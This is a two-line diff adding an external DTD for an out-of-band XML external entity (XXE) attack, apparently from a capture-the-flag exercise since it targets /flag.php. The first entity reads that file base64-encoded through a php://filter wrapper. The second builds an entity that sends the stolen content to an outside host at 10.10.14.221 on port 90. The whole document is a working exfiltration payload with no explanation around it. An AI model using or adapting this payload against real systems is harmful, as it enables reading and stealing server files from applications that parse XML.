@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.221:90/?content=%file;'>">
